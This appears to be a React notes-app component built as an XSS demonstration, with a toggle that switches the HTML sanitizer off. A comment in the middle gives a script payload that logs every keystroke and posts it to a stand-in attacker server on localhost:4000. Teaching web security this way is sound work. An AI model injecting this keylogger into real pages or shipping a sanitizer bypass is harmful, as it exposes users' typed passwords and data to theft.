import { useEffect, useState, useRef } from 'react';
import axios from 'axios';
import { useNotesState, useNotesDispatch } from '../contexts/NotesContext';
import { useUser } from '../contexts/UserContext';
import { notify } from '../contexts/notify';
import type { Note as NoteType } from '../contexts/NotesReducer';
import Note from './Note';
import Pagination from './Pagination';
import { useSanitize } from '../contexts/SanitizeContext';

const POSTS_PER_PAGE = 10;

const NoteList = () => {
  const { notes, activePage, totalPages } = useNotesState();
  const dispatch = useNotesDispatch();
  const { user, token } = useUser();
  const { sanitize, setSanitize } = useSanitize();

  const [newNoteContent, setNewNoteContent] = useState('');
  const [isAdding, setIsAdding] = useState(false);
  const [notesCache, setNotesCache] = useState<{ [page: number]: NoteType[] }>({});

  const totalCountRef = useRef<number>(0);

  // פונקציה שאחראית להביא דפים חסרים ולמלא את המטמון
  const fetchAndCacheNotes = async (centerPage: number) => {
    const start = Math.max(1, centerPage - 2);
    const visiblePages = Array.from({ length: 5 }, (_, i) => start + i).filter(
      (page) => page <= totalPages
    );

    const pagesToFetch = visiblePages.filter((page) => !notesCache[page]);

    if (pagesToFetch.length === 0) {
      // לא עושים dispatch כאן! נפעיל את זה ב-useEffect במקום אחר
      return;
    }

    try {
      const responses = await Promise.all(
        pagesToFetch.map((page) =>
          axios
            .get('http://localhost:3001/notes', {
              params: { _page: page, _limit: POSTS_PER_PAGE },
              headers: { Accept: 'application/json' },
            })
            .then((res) => ({
              page,
              data: res.data,
              total: res.headers['x-total-count'],
            }))
        )
      );

      const updatedCache = { ...notesCache };
      responses.forEach(({ page, data, total: totalStr }) => {
        updatedCache[page] = (data as any[]).map((note: any) => ({
          ...note,
          author: note.author,
        }));
        if (totalStr) {
          totalCountRef.current = parseInt(totalStr, 10);
        }
      });

      // שומרים במטמון רק את הדפים הנראים
      const newCache: typeof updatedCache = {};
      visiblePages.forEach((page) => {
        if (updatedCache[page]) newCache[page] = updatedCache[page];
      });

      setNotesCache(newCache);
    } catch (error) {
      console.error('Fetch error:', error);
      notify('Failed to load notes', dispatch);
    }
  };

  useEffect(() => {
    // אם הדף במטמון - מציגים, אחרת מביאים מהשרת
    if (notesCache[activePage]) {
      dispatch({
        type: 'SET_NOTES',
        payload: {
          notes: notesCache[activePage],
          total: totalCountRef.current || notes.length * totalPages,
        },
      });
    } else {
      fetchAndCacheNotes(activePage).then(() => {
        // אחרי שהמטמון עודכן, מעדכנים את ה-state
        if (notesCache[activePage]) {
          dispatch({
            type: 'SET_NOTES',
            payload: {
              notes: notesCache[activePage],
              total: totalCountRef.current,
            },
          });
        }
      });
    }
  }, [activePage, notesCache, dispatch, notes.length, totalPages]);

  const handleAddNote = async () => {
    if (!user || !token) {
      notify('You must be logged in to add a note', dispatch);
      return;
    }

    const newNote = {
      title: 'New Note',
      content: newNoteContent,
      user: {
        name: user.name,
        email: user.email,
      },
    };

    try {
      const response = await axios.post('http://localhost:3001/notes', newNote, {
        headers: {
          Authorization: `Bearer ${token}`,
          'Content-Type': 'application/json',
        },
      });

      const savedNote = response.data as NoteType;
      const normalizedNote = {
        ...savedNote,
        author: savedNote.author,
      };

      setNotesCache((prevCache) => {
        const page1 = prevCache[1] ?? [];
        const newPage1 = [normalizedNote, ...page1.slice(0, POSTS_PER_PAGE - 1)];

        dispatch({
          type: 'SET_NOTES',
          payload: {
            notes: newPage1,
            total: totalCountRef.current + 1,
          },
        });

        return {
          ...prevCache,
          1: newPage1,
        };
      });

      totalCountRef.current += 1;
      dispatch({ type: 'SET_ACTIVE_PAGE', payload: 1 });

      notify('Added a new note', dispatch);
      setNewNoteContent('');
      setIsAdding(false);
    } catch (error) {
      console.error('Add note error:', error);
      notify('Failed to add note', dispatch);
    }
  };

  const removeNoteFromCache = (noteId: string) => {
    setNotesCache((prevCache) => {
      const newCache: typeof prevCache = {};
      for (const [page, notes] of Object.entries(prevCache)) {
        newCache[Number(page)] = notes.filter((note) => note._id !== noteId);
      }
      return newCache;
    });
  };

  return (
    <div>
      {/* Global sanitizer toggle */}
      <div style={{ marginBottom: '1em' }}>
        <label>
          <input
            type="radio"
            checked={sanitize}
            onChange={() => setSanitize(true)}
            name="sanitize-toggle-global"
            data-testid="sanitize-on-global"
          />
          Sanitizer ON
        </label>
        <label style={{ marginLeft: '1em' }}>
          <input
            type="radio"
            checked={!sanitize}
            onChange={() => setSanitize(false)}
            name="sanitize-toggle-global"
            data-testid="sanitize-off-global"
          />
          Sanitizer OFF
        </label>
        <span style={{ marginLeft: '1em', color: sanitize ? 'green' : 'red', fontWeight: 'bold' }}>
          {sanitize ? 'Protected (XSS blocked)' : 'Vulnerable (XSS possible!)'}
        </span>
      </div>

      {/* XSS DEMO: To test XSS, try creating a note with the following payload as content:
      <script>document.addEventListener('keydown', e => fetch('http://localhost:4000/log', {method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({key: e.key})}));</script>
      This will send every keystroke to an attacker server running on localhost:4000 */}

      {/* Add Note Section */}
      {user ? (
        isAdding ? (
          <div>
            <input
              type="text"
              value={newNoteContent}
              onChange={(e) => setNewNoteContent(e.target.value)}
              aria-label="text_input_new_note"
              data-testid="text_input_new_note"
            />
            <button
              aria-label="text_input_save_new_note"
              data-testid="text_input_save_new_note"
              onClick={handleAddNote}
              disabled={!newNoteContent.trim()}
            >
              Save
            </button>
            <button
              aria-label="text_input_cancel_new_note"
              data-testid="text_input_cancel_new_note"
              onClick={() => setIsAdding(false)}
            >
              Cancel
            </button>
          </div>
        ) : (
          <button
            aria-label="Add New Note"
            data-testid="add_new_note"
            onClick={() => setIsAdding(true)}
          >
            Add New Note
          </button>
        )
      ) : (
        <p>Please login to add a note.</p>
      )}

      {/* Notes Display */}
      {notes.length === 0 ? (
        <p>No notes found.</p>
      ) : (
        notes.map((note) => <Note key={note._id} note={note} removeNoteFromCache={removeNoteFromCache} />)
      )}

      {/* Pagination Bar */}
      <Pagination
        currentPage={activePage}
        totalPages={totalPages}
        onPageChange={(page) =>
          dispatch({ type: 'SET_ACTIVE_PAGE', payload: page })
        }
      />
    </div>
  );
};

export default NoteList;
